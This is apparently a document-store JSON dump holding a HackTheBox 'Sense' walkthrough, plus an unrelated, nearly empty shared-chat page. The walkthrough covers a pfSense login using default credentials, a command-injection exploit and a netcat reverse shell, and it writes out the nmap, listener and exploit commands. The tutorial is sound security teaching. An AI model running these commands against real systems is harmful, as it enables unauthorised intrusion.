{"docstore/metadata": {"5c7a6012-518d-468a-b8a4-8bcfc7a0f3ef": {"doc_hash": "2f9777ba79068a58be7ae2244541ae30267fa0c4e81201a047d5e494c4d45694"}, "d44dc358-20e4-45fe-b1fa-9a9be49f843b": {"doc_hash": "fca30c71df5ecf805da6dbb88049026446de4359a397545eba07c1121125f24b", "ref_doc_id": "5c7a6012-518d-468a-b8a4-8bcfc7a0f3ef"}, "c6c1ecd5-ef45-4785-965f-a67b601d5b2b": {"doc_hash": "e4a7eb07e228a06ef98b268d393e251babdf7081de1a8222d7916dfcc9341065", "ref_doc_id": "5c7a6012-518d-468a-b8a4-8bcfc7a0f3ef"}, "02f6b6e3-49ab-487b-81f8-21975fa2942b": {"doc_hash": "3d38e778766dfd4d8da3171d5ed027e57450e9b0196418140d8167419692f0a3", "ref_doc_id": "be954197-e254-4680-a09e-7911b6bfd7f4"}, "be954197-e254-4680-a09e-7911b6bfd7f4": {"doc_hash": "3d38e778766dfd4d8da3171d5ed027e57450e9b0196418140d8167419692f0a3"}}, "docstore/data": {"d44dc358-20e4-45fe-b1fa-9a9be49f843b": {"__data__": {"id_": "d44dc358-20e4-45fe-b1fa-9a9be49f843b", "embedding": null, "metadata": {}, "excluded_embed_metadata_keys": [], "excluded_llm_metadata_keys": [], "relationships": {"1": {"node_id": "5c7a6012-518d-468a-b8a4-8bcfc7a0f3ef", "node_type": "4", "metadata": {}, "hash": "2f9777ba79068a58be7ae2244541ae30267fa0c4e81201a047d5e494c4d45694", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "c6c1ecd5-ef45-4785-965f-a67b601d5b2b", "node_type": "1", "metadata": {}, "hash": "e4a7eb07e228a06ef98b268d393e251babdf7081de1a8222d7916dfcc9341065", "class_name": "RelatedNodeInfo"}}, "text": "Sense Walkthrough \u2013 HackTheBox Search Submit your search query Forum Donate August 12, 2022 / #cybersecurity Sense Walkthrough \u2013 HackTheBox By Shuaib Oseni HackTheBox is an online hacking platform that allows you to test and practice your penetration testing skills. It contains several vulnerable labs that are constantly updated. Some of them simulate real-world scenarios and some of them lean more towards a Capture The Flag (CTF) style of challenge. Note: Only write-ups of retired HTB machines are allowed. Prerequisites To get the most out of this walkthrough, you'll need the following: HackTheBox VIP subscription. Kali Linux operating system. Basic bruteforcing knowledge. Machine Information Name: Sense Ip Address: 10.10.10.60 Operating System: FreeBSD Fasten your seat belts, everyone \u2013 we are going for a ride! Step 1 \u2013 Do Some Reconnaissance Reconnaissance is the process of gathering as much information about a target system as possible, and it is usually the first step toward any hack. Let's start by running an Nmap scan to gather information about the open ports and services running on this machine by running the following command: nmap -A -T4 -p- 10.10.10.60 Here's the result: nmap -A -T4 -p- 10.10.10.60\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 05:23 EST\nNmap scan report for 10.10.10.60\nHost is up (0.36s latency).\nNot shown: 65533 filtered ports\nPORT    STATE SERVICE    VERSION\n80/tcp  open  http       lighttpd 1.4.35\n|_http-server-header: lighttpd/1.4.35\n|_http-title: Did not follow redirect to https://10.10.10.60/\n443/tcp open  ssl/https?\n| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US\n| Not valid before: 2017-10-14T19:21:35\n|_Not valid after:  2023-04-06T19:21:35\n|_ssl-date: TLS randomness does not represent time\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done : 1 IP address (1 host up) scanned in 1561.11 seconds From the scan result we can that there are 2 open ports: Port 80 - Hyper Text Transfer Protocol (HTTP) Port 443 - Hyper Text Transfer Protocol Secured (HTTPS) Step 2 \u2013 Visit the IP Address Now let's visit the IP address in a browser. sense login page We get a pfsense login page. The default credential for pfsense is admin/pfsense . Unfortunately, these credentials didn't work. Step 3 \u2013 Use Directory Brute Force You use directory brute force to find hidden directories on a web application. Now, let's perform a directory brute force using dirbuster . dirbuster dirbuster gave us a couple of interesting things: Pages with response code of 200. A changelog-txt file. A system-user-txt file. changelog-txt and system-user-txt look super juicy, so let's see if we can view their content. To read the content of this file, we type 10.10.10.60/changelog.txt in our browser. changelog.txt contains the following: changelog.txt file To read the content of this file, we type 10.10.10.60/system-users.txt in our browser. system-users.txt contains the following: system-user.txt file Step 4 \u2013 Try to Login system-users.txt contains a username \"Rohit\" and a password \"company defaults\", which doesn't look like a password. What if company defaults = pfsense default password? Let's try it: username: Rohit pasword: pfsense dashboard We get redirected to Rohit's dashboard. Let's click around to see if we can get juicy information or a version number. The admin page contains a version number version number Step 5 \u2013 Fire the Exploit Now that we have a version number, let's use searchsploit to check if there's any known vulnerability on pfsense 2.1.3. Searchsploit is an Exploit-DB command-line search tool for ExploitDB , an exploits archive. Searchsploit comes preinstalled in Kali.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3791, "text_template": "{metadata_str}\n\n{content}", "metadata_template": "{key}: {value}", "metadata_seperator": "\n", "class_name": "TextNode"}, "__type__": "1"}, "c6c1ecd5-ef45-4785-965f-a67b601d5b2b": {"__data__": {"id_": "c6c1ecd5-ef45-4785-965f-a67b601d5b2b", "embedding": null, "metadata": {}, "excluded_embed_metadata_keys": [], "excluded_llm_metadata_keys": [], "relationships": {"1": {"node_id": "5c7a6012-518d-468a-b8a4-8bcfc7a0f3ef", "node_type": "4", "metadata": {}, "hash": "2f9777ba79068a58be7ae2244541ae30267fa0c4e81201a047d5e494c4d45694", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "d44dc358-20e4-45fe-b1fa-9a9be49f843b", "node_type": "1", "metadata": {}, "hash": "fca30c71df5ecf805da6dbb88049026446de4359a397545eba07c1121125f24b", "class_name": "RelatedNodeInfo"}}, "text": "system-users.txt contains the following: system-user.txt file Step 4 \u2013 Try to Login system-users.txt contains a username \"Rohit\" and a password \"company defaults\", which doesn't look like a password. What if company defaults = pfsense default password? Let's try it: username: Rohit pasword: pfsense dashboard We get redirected to Rohit's dashboard. Let's click around to see if we can get juicy information or a version number. The admin page contains a version number version number Step 5 \u2013 Fire the Exploit Now that we have a version number, let's use searchsploit to check if there's any known vulnerability on pfsense 2.1.3. Searchsploit is an Exploit-DB command-line search tool for ExploitDB , an exploits archive. Searchsploit comes preinstalled in Kali. Now let's run the following command in our terminal: searchsploit pfsense searchsploit result Now that we know this version is vulnerable to a Command Injection attack, let's try to exploit it. Command injection is a web security vulnerability that allows an attacker to execute arbitrary OS commands on an application server, ultimately compromising the application and its data. This happens when unsanitized user input is passed through an application. Searchsploit provides us with a Python exploit, so let's try it out. Before firing this exploit, we need to setup a Netcat listener. Netcat is a network utility program with the listener being one of its features. The listener allows you to listen on open ports, create reverse shells, and send data or files over a network. nc -lnvp 9001 Next, we fire our exploit by running the following command: python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 9001 --username rohit --password pfsense Boom! We got a shell: shell Step 6 \u2013 Find the user-flag Our shell is not a PTY shell, meaning there are specific commands we can't run. However, let's see if we can grab any flag with our current shell. Let's move to the rohit directory and see what we can find. user flag Yayyyyyyy we got our user flag! Step 7 \u2013 Find the root-flag What if the root flag is available to us without needing privilege escalation? Let's see. Privilege escalation is an attack whereby a user gets elevated access to a system beyond what is intended. Let's move to the root directory and see what we can find. root flag Booooom! We have successfully rooted this machine. Conclusion We were able to root this machine because it was vulnerable to Command Injection attack. Below are some of the ways you can prevent this vulnerability: Sanitize user input. Avoid calling OS commands directly. Patch and update application often. If you read this far, thank the author to show them you care. Say Thanks Learn to code for free. freeCodeCamp's open source curriculum has helped more than 40,000 people get jobs as developers. Get started ADVERTISEMENT freeCodeCamp is a donor-supported tax-exempt 501(c)(3) charity organization (United States Federal Tax Identification Number: 82-0779546) Our mission: to help people learn to code for free. We accomplish this by creating thousands of videos, articles, and interactive coding lessons - all freely available to the public. Donations to freeCodeCamp go toward our education initiatives, and help pay for servers, services, and staff. You can make a tax-deductible donation here . Trending Books and Handbooks Learn CSS Transform Build a Static Blog Build an AI Chatbot What is Programming? Python Code Examples Open Source for Devs HTTP Networking in JS Write React Unit Tests Learn Algorithms in JS How to Write Clean Code Learn PHP Learn Java Learn Swift Learn Golang Learn Node.js Learn CSS Grid Learn Solidity Learn Express.js Learn JS Modules Learn Apache Kafka REST API Best Practices Front-End JS Development Learn to Build REST APIs Intermediate TS and React Command Line for Beginners Intro to Operating Systems Learn to Build GraphQL APIs OSS Security Best Practices Distributed Systems Patterns Software Architecture Patterns Mobile App Our Charity About Alumni Network Open Source Shop Support Sponsors Academic Honesty Code of Conduct Privacy Policy Terms of Service Copyright Policy", "mimetype": "text/plain", "start_char_idx": 3028, "end_char_idx": 7172, "text_template": "{metadata_str}\n\n{content}", "metadata_template": "{key}: {value}", "metadata_seperator": "\n", "class_name": "TextNode"}, "__type__": "1"}, "02f6b6e3-49ab-487b-81f8-21975fa2942b": {"__data__": {"id_": "02f6b6e3-49ab-487b-81f8-21975fa2942b", "embedding": null, "metadata": {}, "excluded_embed_metadata_keys": [], "excluded_llm_metadata_keys": [], "relationships": {"1": {"node_id": "be954197-e254-4680-a09e-7911b6bfd7f4", "node_type": "4", "metadata": {}, "hash": "3d38e778766dfd4d8da3171d5ed027e57450e9b0196418140d8167419692f0a3", "class_name": "RelatedNodeInfo"}}, "text": "ChatGPT - Project Management Overview Project Management Overview This conversation may reflect the link creator\u2019s personalized data, which isn\u2019t shared and can meaningfully change how the model responds. You said: Unit 2 Project Plan.pptx Presentation ChatGPT said: ChatGPT You said: ChatGPT said: ChatGPT You said: Unit 1. Introduction to Project Management.pptx Presentation ChatGPT You said: ChatGPT said: ChatGPT Continue this conversation Report content | Terms of use | Privacy policy |", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 493, "text_template": "{metadata_str}\n\n{content}", "metadata_template": "{key}: {value}", "metadata_seperator": "\n", "class_name": "TextNode"}, "__type__": "1"}}, "docstore/ref_doc_info": {"5c7a6012-518d-468a-b8a4-8bcfc7a0f3ef": {"node_ids": ["d44dc358-20e4-45fe-b1fa-9a9be49f843b", "c6c1ecd5-ef45-4785-965f-a67b601d5b2b"], "metadata": {}}, "be954197-e254-4680-a09e-7911b6bfd7f4": {"node_ids": ["02f6b6e3-49ab-487b-81f8-21975fa2942b"], "metadata": {}}}}